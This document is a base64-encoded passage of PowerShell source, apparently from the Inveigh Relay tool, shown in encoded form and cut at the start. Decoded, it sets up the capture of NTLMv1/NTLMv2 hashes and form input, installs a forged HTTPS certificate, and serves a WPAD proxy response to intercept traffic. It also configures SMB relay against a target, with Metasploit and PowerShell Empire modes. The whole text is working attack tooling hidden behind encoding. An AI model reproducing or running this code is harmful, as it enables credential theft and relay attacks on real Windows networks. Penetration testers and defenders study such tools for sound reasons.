lX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5QT1NUX3JlcXVlc3RfZmlsZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5jb25zb2xlX2lucHV0ID0gJHRydWUKICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAkaW52ZWlnaC5maWxlX291dHB1dCA9ICRmYWxzZQogICAgJGludmVpZ2guSFRUUFNfZXhpc3RpbmdfY2VydGlmaWNhdGUgPSAkZmFsc2UKICAgICRpbnZlaWdoLkhUVFBTX2ZvcmNlX2NlcnRpZmljYXRlX2RlbGV0ZSA9ICRmYWxzZQogICAgJGludmVpZ2gubG9nX291dHB1dCA9ICR0cnVlCiAgICAkaW52ZWlnaC5jbGVhcnRleHRfb3V0X2ZpbGUgPSAkb3V0cHV0X2RpcmVjdG9yeSArICJcSW52ZWlnaC1DbGVhcnRleHQudHh0IgogICAgJGludmVpZ2gubG9nX291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtTG9nLnR4dCIKICAgICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSA9ICRvdXRwdXRfZGlyZWN0b3J5ICsgIlxJbnZlaWdoLU5UTE12MS50eHQiCiAgICAkaW52ZWlnaC5OVExNdjJfb3V0X2ZpbGUgPSAkb3V0cHV0X2RpcmVjdG9yeSArICJcSW52ZWlnaC1OVExNdjIudHh0IgogICAgJGludmVpZ2guUE9TVF9yZXF1ZXN0X291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtRm9ybUlucHV0LnR4dCIKfQoKaWYoJFN0YXJ0dXBDaGVja3MgLWVxICdZJykKewoKICAgICRmaXJld2FsbF9zdGF0dXMgPSBuZXRzaCBhZHZmaXJld2FsbCBzaG93IGFsbHByb2ZpbGVzIHN0YXRlIHwgV2hlcmUtT2JqZWN0IHskXyAtbWF0Y2ggJ09OJ30KCiAgICBpZigkSFRUUCAtZXEgJ1knKQogICAgewogICAgICAgICRIVFRQX3BvcnRfY2hlY2sgPSBuZXRzdGF0IC1hbnAgVENQIHwgZmluZHN0ciBMSVNURU5JTkcgfCBmaW5kc3RyIC9DOiIkSFRUUElQYDokSFRUUFBvcnQgIgogICAgfQoKICAgIGlmKCRIVFRQUyAtZXEgJ1knKQogICAgewogICAgICAgICRIVFRQU19wb3J0X2NoZWNrID0gbmV0c3RhdCAtYW5wIFRDUCB8IGZpbmRzdHIgTElTVEVOSU5HIHwgZmluZHN0ciAvQzoiJEhUVFBJUGA6JEhUVFBTUG9ydCAiCiAgICB9CgogICAgaWYoJFByb3h5IC1lcSAnWScpCiAgICB7CiAgICAgICAgJHByb3h5X3BvcnRfY2hlY2sgPSBuZXRzdGF0IC1hbnAgVENQIHwgZmluZHN0ciBMSVNURU5JTkcgfCBmaW5kc3RyIC9DOiIkSFRUUElQYDokUHJveHlQb3J0ICIKICAgIH0KCn0KCiRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgPSAkdHJ1ZQokaW52ZWlnaC5TTUJfcmVsYXkgPSAkdHJ1ZQoKaWYoJFN0YXR1c091dHB1dCAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfb3V0cHV0ID0gJHRydWUKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19vdXRwdXQgPSAkZmFsc2UKfQoKaWYoJE91dHB1dFN0cmVhbU9ubHkgLWVxICdZJykKewogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJHRydWUKfQplbHNlCnsKICAgICRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSA9ICRmYWxzZQp9CgppZigkVG9vbCAtZXEgMSkgIyBNZXRhc3Bsb2l0IEludGVyYWN0aXZlIFBvd2VyU2hlbGwgUGF5bG9hZHMgYW5kIE1ldGVycHJldGVyJ3MgUG93ZXJTaGVsbCBFeHRlbnNpb24KewogICAgJGludmVpZ2gudG9vbCA9IDEKICAgICRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSA9ICR0cnVlCiAgICAkaW52ZWlnaC5uZXdsaW5lID0gIiIKICAgICRDb25zb2xlT3V0cHV0ID0gIk4iCn0KZWxzZWlmKCRUb29sIC1lcSAyKSAjIFBvd2VyU2hlbGwgRW1waXJlCnsKICAgICRpbnZlaWdoLnRvb2wgPSAyCiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkdHJ1ZQogICAgJGludmVpZ2guY29uc29sZV9pbnB1dCA9ICRmYWxzZQogICAgJGludmVpZ2gubmV3bGluZSA9ICIiCiAgICAkTG9nT3V0cHV0ID0gIk4iCiAgICAkU2hvd0hlbHAgPSAiTiIKCiAgICBzd2l0Y2ggKCRDb25zb2xlT3V0cHV0KQogICAgewoKICAgICAgICAnTG93JwogICAgICAgIHsKICAgICAgICAgICAgJENvbnNvbGVPdXRwdXQgPSAiTG93IgogICAgICAgIH0KCiAgICAgICAgJ01lZGl1bScKICAgICAgICB7CiAgICAgICAgICAgICRDb25zb2xlT3V0cHV0ID0gIk1lZGl1bSIKICAgICAgICB9CgogICAgICAgIGRlZmF1bHQKICAgICAgICB7CiAgICAgICAgICAgICRDb25zb2xlT3V0cHV0ID0gIlkiCiAgICAgICAgfQoKICAgIH0KCn0KZWxzZQp7CiAgICAkaW52ZWlnaC50b29sID0gMAogICAgJGludmVpZ2gubmV3bGluZSA9ICIiCn0KCiMgV3JpdGUgc3RhcnR1cCBtZXNzYWdlcwokaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJJbnZlaWdoIFJlbGF5ICRpbnZlaWdoX3ZlcnNpb24gc3RhcnRlZCBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpID4gJG51bGwKCmlmKCRGaWxlT3V0cHV0IC1lcSAnWScpCnsKICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIFJlbGF5ICRpbnZlaWdoX3ZlcnNpb24gc3RhcnRlZCIpID4gJG51bGwKfQoKaWYoJExvZ091dHB1dCAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggUmVsYXkgc3RhcnRlZCIpID4gJG51bGwKICAgICRpbnZlaWdoLmxvZ19vdXRwdXQgPSAkdHJ1ZQp9CmVsc2UKewogICAgJGludmVpZ2gubG9nX291dHB1dCA9ICRmYWxzZQp9CgppZigkZmlyZXdhbGxfc3RhdHVzKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXaW5kb3dzIEZpcmV3YWxsID0gRW5hYmxlZCIpICA+ICRudWxsCgogICAgJGZpcmV3YWxsX3J1bGVzID0gTmV3LU9iamVjdCAtY29tT2JqZWN0IEhOZXRDZmcuRndQb2xpY3kyCiAgICAkZmlyZXdhbGxfcG93ZXJzaGVsbCA9ICRmaXJld2FsbF9ydWxlcy5ydWxlcyB8IFdoZXJlLU9iamVjdCB7JF8uRW5hYmxlZCAtZXEgJHRydWUgLWFuZCAkXy5EaXJlY3Rpb24gLWVxIDF9IHxTZWxlY3QtT2JqZWN0IC1Qcm9wZXJ0eSBOYW1lIHwgU2VsZWN0LVN0cmluZyAiV2luZG93cyBQb3dlclNoZWxsfSIKCiAgICBpZigkZmlyZXdhbGxfcG93ZXJzaGVsbCkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXaW5kb3dzIEZpcmV3YWxsIC0gUG93ZXJTaGVsbC5leGUgPSBBbGxvd2VkIikgID4gJG51bGwKICAgIH0KCn0KCmlmKCRIVFRQIC1lcSAnWScpCnsKCiAgICBpZigkSFRUUF9wb3J0X2NoZWNrKQogICAgewogICAgICAgICRIVFRQID0gIk4iCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUCBDYXB0dXJlL1JlbGF5IERpc2FibGVkIER1ZSBUbyBJbiBVc2UgUG9ydCAkSFRUUFBvcnQiKSAgPiAkbnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgQ2FwdHVyZS9SZWxheSA9IEVuYWJsZWQiKSAgPiAkbnVsbAoKICAgICAgICBpZigkSFRUUElQKQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUCBJUCBBZGRyZXNzID0gJEhUVFBJUCIpID4gJG51bGwKICAgICAgICB9CgogICAgICAgIGlmKCRIVFRQUG9ydCAtbmUgODApCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQIFBvcnQgPSAkSFRUUFBvcnQiKSA+ICRudWxsCiAgICAgICAgfQogICAgfQoKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgQ2FwdHVyZS9SZWxheSA9IERpc2FibGVkIikgID4gJG51bGwKfQoKaWYoJEhUVFBTIC1lcSAnWScpCnsKCiAgICBpZigkSFRUUFNfcG9ydF9jaGVjaykKICAgIHsKICAgICAgICAkSFRUUFMgPSAiTiIKICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICRmYWxzZQogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUvUmVsYXkgRGlzYWJsZWQgRHVlIFRvIEluIFVzZSBQb3J0ICRIVFRQU1BvcnQiKSAgPiAkbnVsbAogICAgfQogICAgZWxzZQogICAgewoKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLmNlcnRpZmljYXRlX2lzc3VlciA9ICRIVFRQU0NlcnRJc3N1ZXIKICAgICAgICAgICAgJGludmVpZ2guY2VydGlmaWNhdGVfQ04gPSAkSFRUUFNDZXJ0U3ViamVjdAogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQUyBDZXJ0aWZpY2F0ZSBJc3N1ZXIgPSAiICsgJGludmVpZ2guY2VydGlmaWNhdGVfaXNzdWVyKSAgPiAkbnVsbAogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQUyBDZXJ0aWZpY2F0ZSBDTiA9ICIgKyAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9DTikgID4gJG51bGwKICAgICAgICAgICAgJGNlcnRpZmljYXRlX2NoZWNrID0gKEdldC1DaGlsZEl0ZW0gQ2VydDpcTG9jYWxNYWNoaW5lXE15IHwgV2hlcmUtT2JqZWN0IHskXy5Jc3N1ZXIgLW1hdGNoICRpbnZlaWdoLmNlcnRpZmljYXRlX2lzc3Vlcn0pCgogICAgICAgICAgICBpZighJGNlcnRpZmljYXRlX2NoZWNrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjIGNyZWRpdCB0byBzdWJUZWUgZm9yIGNlcnQgY3JlYXRpb24gY29kZSBodHRwczovL2dpdGh1Yi5jb20vc3ViVGVlL0ludGVyY2VwdG9yCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfZGlzdGluZ3Vpc2hlZF9uYW1lID0gbmV3LW9iamVjdCAtY29tICJYNTA5RW5yb2xsbWVudC5DWDUwMERpc3Rpbmd1aXNoZWROYW1lIgogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2Rpc3Rpbmd1aXNoZWRfbmFtZS5FbmNvZGUoICJDTj0iICsgJGludmVpZ2guY2VydGlmaWNhdGVfQ04sICRjZXJ0aWZpY2F0ZV9kaXN0aW5ndWlzaGVkX25hbWUuWDUwME5hbWVGbGFncy5YNTAwTmFtZUZsYWdzLlhDTl9DRVJUX05BTUVfU1RSX05PTkUpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfaXNzdWVyX2Rpc3Rpbmd1aXNoZWRfbmFtZSA9IG5ldy1vYmplY3QgLWNvbSAiWDUwOUVucm9sbG1lbnQuQ1g1MDBEaXN0aW5ndWlzaGVkTmFtZSIKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9pc3N1ZXJfZGlzdGluZ3Vpc2hlZF9uYW1lLkVuY29kZSgiQ049IiArICRpbnZlaWdoLmNlcnRpZmljYXRlX2lzc3VlciwgJGNlcnRpZmljYXRlX2Rpc3Rpbmd1aXNoZWRfbmFtZS5YNTAwTmFtZUZsYWdzLlg1MDBOYW1lRmxhZ3MuWENOX0NFUlRfTkFNRV9TVFJfTk9ORSkKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9rZXkgPSBuZXctb2JqZWN0IC1jb20gIlg1MDlFbnJvbGxtZW50LkNYNTA5UHJpdmF0ZUtleSIKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9rZXkuUHJvdmlkZXJOYW1lID0gIk1pY3Jvc29mdCBFbmhhbmNlZCBSU0EgYW5kIEFFUyBDcnlwdG9ncmFwaGljIFByb3ZpZGVyIgogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2tleS5LZXlTcGVjID0gMgogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2tleS5MZW5ndGggPSAyMDQ4CgkJCSAgICAkY2VydGlmaWNhdGVfa2V5Lk1hY2hpbmVDb250ZXh0ID0gMQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2tleS5DcmVhdGUoKQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3NlcnZlcl9hdXRoX09JRCA9IG5ldy1vYmplY3QgLWNvbSAiWDUwOUVucm9sbG1lbnQuQ09iamVjdElkIgoJCQkgICAgJGNlcnRpZmljYXRlX3NlcnZlcl9hdXRoX09JRC5Jbml0aWFsaXplRnJvbVZhbHVlKCIxLjMuNi4xLjUuNS43LjMuMSIpCgkJCSAgICAkY2VydGlmaWNhdGVfZW5oYW5jZWRfa2V5X3VzYWdlX09JRCA9IG5ldy1vYmplY3QgLWNvbSAiWDUwOUVucm9sbG1lbnQuQ09iamVjdElkcy4xIgoJCQkgICAgJGNlcnRpZmljYXRlX2VuaGFuY2VkX2tleV91c2FnZV9PSUQuYWRkKCRjZXJ0aWZpY2F0ZV9zZXJ2ZXJfYXV0aF9PSUQpCgkJCSAgICAkY2VydGlmaWNhdGVfZW5oYW5jZWRfa2V5X3VzYWdlX2V4dGVuc2lvbiA9IG5ldy1vYmplY3QgLWNvbSAiWDUwOUVucm9sbG1lbnQuQ1g1MDlFeHRlbnNpb25FbmhhbmNlZEtleVVzYWdlIgoJCQkgICAgJGNlcnRpZmljYXRlX2VuaGFuY2VkX2tleV91c2FnZV9leHRlbnNpb24uSW5pdGlhbGl6ZUVuY29kZSgkY2VydGlmaWNhdGVfZW5oYW5jZWRfa2V5X3VzYWdlX09JRCkKCQkJICAgICRjZXJ0aWZpY2F0ZSA9IG5ldy1vYmplY3QgLWNvbSAiWDUwOUVucm9sbG1lbnQuQ1g1MDlDZXJ0aWZpY2F0ZVJlcXVlc3RDZXJ0aWZpY2F0ZSIKCQkJICAgICRjZXJ0aWZpY2F0ZS5Jbml0aWFsaXplRnJvbVByaXZhdGVLZXkoMiwkY2VydGlmaWNhdGVfa2V5LCIiKQoJCQkgICAgJGNlcnRpZmljYXRlLlN1YmplY3QgPSAkY2VydGlmaWNhdGVfZGlzdGluZ3Vpc2hlZF9uYW1lCgkJCSAgICAkY2VydGlmaWNhdGUuSXNzdWVyID0gJGNlcnRpZmljYXRlX2lzc3Vlcl9kaXN0aW5ndWlzaGVkX25hbWUKCQkJICAgICRjZXJ0aWZpY2F0ZS5Ob3RCZWZvcmUgPSAoZ2V0LWRhdGUpLkFkZERheXMoLTI3MSkKCQkJICAgICRjZXJ0aWZpY2F0ZS5Ob3RBZnRlciA9ICRjZXJ0aWZpY2F0ZS5Ob3RCZWZvcmUuQWRkRGF5cyg4MjQpCgkJCSAgICAkY2VydGlmaWNhdGVfaGFzaF9hbGdvcml0aG1fT0lEID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFg1MDlFbnJvbGxtZW50LkNPYmplY3RJZAoJCQkgICAgJGNlcnRpZmljYXRlX2hhc2hfYWxnb3JpdGhtX09JRC5Jbml0aWFsaXplRnJvbUFsZ29yaXRobU5hbWUoMSwwLDAsIlNIQTI1NiIpCgkJCSAgICAkY2VydGlmaWNhdGUuSGFzaEFsZ29yaXRobSA9ICRjZXJ0aWZpY2F0ZV9oYXNoX2FsZ29yaXRobV9PSUQKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZS5YNTA5RXh0ZW5zaW9ucy5BZGQoJGNlcnRpZmljYXRlX2VuaGFuY2VkX2tleV91c2FnZV9leHRlbnNpb24pCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfYmFzaWNfY29uc3RyYWludHMgPSBuZXctb2JqZWN0IC1jb20gIlg1MDlFbnJvbGxtZW50LkNYNTA5RXh0ZW5zaW9uQmFzaWNDb25zdHJhaW50cyIKCQkJICAgICRjZXJ0aWZpY2F0ZV9iYXNpY19jb25zdHJhaW50cy5Jbml0aWFsaXplRW5jb2RlKCJ0cnVlIiwxKQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlLlg1MDlFeHRlbnNpb25zLkFkZCgkY2VydGlmaWNhdGVfYmFzaWNfY29uc3RyYWludHMpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGUuRW5jb2RlKCkKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9lbnJvbGxtZW50ID0gbmV3LW9iamVjdCAtY29tICJYNTA5RW5yb2xsbWVudC5DWDUwOUVucm9sbG1lbnQiCgkJCSAgICAkY2VydGlmaWNhdGVfZW5yb2xsbWVudC5Jbml0aWFsaXplRnJvbVJlcXVlc3QoJGNlcnRpZmljYXRlKQoJCQkgICAgJGNlcnRpZmljYXRlX2RhdGEgPSAkY2VydGlmaWNhdGVfZW5yb2xsbWVudC5DcmVhdGVSZXF1ZXN0KDApCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfZW5yb2xsbWVudC5JbnN0YWxsUmVzcG9uc2UoMiwkY2VydGlmaWNhdGVfZGF0YSwwLCIiKQogICAgICAgICAgICAgICAgJGludmVpZ2guY2VydGlmaWNhdGUgPSAoR2V0LUNoaWxkSXRlbSBDZXJ0OlxMb2NhbE1hY2hpbmVcTXkgfCBXaGVyZS1PYmplY3QgeyRfLklzc3VlciAtbWF0Y2ggJGludmVpZ2guY2VydGlmaWNhdGVfaXNzdWVyfSkKICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBTID0gJHRydWUKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUvUmVsYXkgPSBFbmFibGVkIikgID4gJG51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZigkSFRUUFNGb3JjZUNlcnREZWxldGUgLWVxICdZJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQU19mb3JjZV9jZXJ0aWZpY2F0ZV9kZWxldGUgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBTX2V4aXN0aW5nX2NlcnRpZmljYXRlID0gJHRydWUKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUgPSBVc2luZyBFeGlzdGluZyBDZXJ0aWZpY2F0ZSIpICA+ICRudWxsCiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgICAkSFRUUFMgPSAiTiIKICAgICAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkZmFsc2UKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUFMgQ2FwdHVyZS9SZWxheSBEaXNhYmxlZCBEdWUgVG8gQ2VydGlmaWNhdGUgRXJyb3IiKSAgPiAkbnVsbAogICAgICAgIH0KCiAgICB9Cgp9CmVsc2UKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUFMgQ2FwdHVyZS9SZWxheSA9IERpc2FibGVkIikgID4gJG51bGwKfQoKaWYoJEhUVFAgLWVxICdZJyAtb3IgJEhUVFBTIC1lcSAnWScpCnsKCiAgICBpZigkQ2hhbGxlbmdlKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIk5UTE0gQ2hhbGxlbmdlID0gJENoYWxsZW5nZSIpICA+ICRudWxsCiAgICB9CgogICAgaWYoJE1hY2hpbmVBY2NvdW50cyAtZXEgJ04nKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIk1hY2hpbmUgQWNjb3VudCBDYXB0dXJlID0gRGlzYWJsZWQiKSA+ICRudWxsCiAgICAgICAgJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyA9ICRmYWxzZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLm1hY2hpbmVfYWNjb3VudHMgPSAkdHJ1ZQogICAgfQoKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIldQQUQgQXV0aGVudGljYXRpb24gPSAkV1BBREF1dGgiKSA+ICRudWxsCgogICAgaWYoJFdQQURBdXRoIC1lcSAiTlRMTSIpCiAgICB7CiAgICAgICAgJFdQQURBdXRoSWdub3JlID0gKCRXUEFEQXV0aElnbm9yZSB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5UcmltKCl9KQoKICAgICAgICBpZigkV1BBREF1dGhJZ25vcmUuQ291bnQgLWd0IDApCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXUEFEIE5UTE0gQXV0aGVudGljYXRpb24gSWdub3JlIExpc3QgPSAiICsgKCRXUEFEQXV0aElnbm9yZSAtam9pbiAiLCIpKSAgPiAkbnVsbAogICAgICAgIH0KCiAgICB9CgogICAgJEhUVFBSZXNldERlbGF5ID0gKCRIVFRQUmVzZXREZWxheSB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5UcmltKCl9KQoKICAgIGlmKCRIVFRQUmVzZXREZWxheS5Db3VudCAtZ3QgMCkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQIFJlc2V0IERlbGF5IExpc3QgPSAiICsgKCRIVFRQUmVzZXREZWxheSAtam9pbiAiLCIpKSAgPiAkbnVsbAogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgUmVzZXQgRGVsYXkgVGltZW91dCA9ICRIVFRQUmVzZXREZWxheVRpbWVvdXQgU2Vjb25kcyIpID4gJG51bGwKICAgIH0KCn0KCmlmKCRQcm94eSAtZXEgJ1knKQp7CgogICAgaWYoJHByb3h5X3BvcnRfY2hlY2spCiAgICB7CiAgICAgICAgJEhUVFAgPSAiTiIKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJQcm94eSBDYXB0dXJlL1JlbGF5IERpc2FibGVkIER1ZSBUbyBJbiBVc2UgUG9ydCAkUHJveHlQb3J0IikgID4gJG51bGwKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJQcm94eSBDYXB0dXJlL1JlbGF5ID0gRW5hYmxlZCIpICA+ICRudWxsCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUHJveHkgUG9ydCA9ICRQcm94eVBvcnQiKSA+ICRudWxsCiAgICAgICAgJFByb3h5UG9ydEZhaWxvdmVyID0gJFByb3h5UG9ydCArIDEKICAgICAgICAkV1BBRFJlc3BvbnNlID0gImZ1bmN0aW9uIEZpbmRQcm94eUZvclVSTCh1cmwsaG9zdCl7cmV0dXJuIGAiUFJPWFkgJHByb3h5X1dQQURfSVBgOiRQcm94eVBvcnQ7IFBST1hZICRwcm94eV9XUEFEX0lQYDokUHJveHlQb3J0RmFpbG92ZXI7IERJUkVDVGAiO30iCiAgICAgICAgJFByb3h5SWdub3JlID0gKCRQcm94eUlnbm9yZSB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5UcmltKCl9KQoKICAgICAgICBpZigkUHJveHlJZ25vcmUuQ291bnQgLWd0IDApCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJQcm94eSBJZ25vcmUgTGlzdCA9ICIgKyAoJFByb3h5SWdub3JlIC1qb2luICIsIikpICA+ICRudWxsCiAgICAgICAgfQoKICAgIH0KCn0KCiRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlbGF5IFRhcmdldCA9ICRUYXJnZXQiKSA+ICRudWxsCgppZigkVXNlcm5hbWVzKQp7CgogICAgaWYoJFVzZXJuYW1lcy5Db3VudCAtZXEgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWxheSBVc2VybmFtZSA9ICIgKyAoJFVzZXJuYW1lcyAtam9pbiAiLCIpKSA+ICRudWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVsYXkgVXNlcm5hbWVzID0gIiArICgkVXNlcm5hbWVzIC1qb2luICIsIikpID4gJG51bGwKICAgIH0KCn0KCmlmKCRSZWxheUF1dG9EaXNhYmxlIC1lcSAnWScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlbGF5IEF1dG8gRGlzYWJsZSA9IEVuYWJsZWQiKSA+ICRudWxsCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWxheSBBdXRvIERpc2FibGUgPSBEaXNhYmxlZCIpID4gJG51bGwKfQoKaWYoJFJlbGF5QXV0b0V4aXQgLWVxICdZJykKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVsYXkgQXV0byBFeGl0ID0gRW5hYmxlZCIpID4gJG51bGwKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlbGF5IEF1dG8gRXhpdCA9IERpc2FibGVkIikgPiAkbnVsbAp9CgppZigkU2VydmljZSkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVsYXkgU2VydmljZSA9ICRTZXJ2aWNlIikgPiAkbnVsbAp9CgppZigkU01CMSkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFZlcnNpb24gPSBTTUIxIikgPiAkbnVsbAogICAgJFNNQl92ZXJzaW9uID0gJ1NNQjEnCn0KCmlmKCRDb25zb2xlT3V0cHV0IC1uZSAnTicpCnsKICAgIAogICAgaWYoJENvbnNvbGVPdXRwdXQgLWVxICdZJykKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgQ29uc29sZSBPdXRwdXQgPSBFbmFibGVkIikgID4gJG51bGwKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgQ29uc29sZSBPdXRwdXQgPSAkQ29uc29sZU91dHB1dCIpICA+ICRudWxsCiAgICB9CgogICAgJGludmVpZ2guY29uc29sZV9vdXRwdXQgPSAkdHJ1ZQoKICAgIGlmKCRDb25zb2xlU3RhdHVzIC1lcSAxKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkNvbnNvbGUgU3RhdHVzID0gJENvbnNvbGVTdGF0dXMgTWludXRlIikgID4gJG51bGwKICAgIH0KICAgIGVsc2VpZigkQ29uc29sZVN0YXR1cyAtZ3QgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJDb25zb2xlIFN0YXR1cyA9ICRDb25zb2xlU3RhdHVzIE1pbnV0ZXMiKSAgPiAkbnVsbAogICAgfQoKfQplbHNlCnsKCiAgICBpZigkaW52ZWlnaC50b29sIC1lcSAxKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlYWwgVGltZSBDb25zb2xlIE91dHB1dCBEaXNhYmxlZCBEdWUgVG8gRXh0ZXJuYWwgVG9vbCBTZWxlY3Rpb24iKSA+ICRudWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVhbCBUaW1lIENvbnNvbGUgT3V0cHV0ID0gRGlzYWJsZWQiKSA+ICRudWxsCiAgICB9Cgp9Cg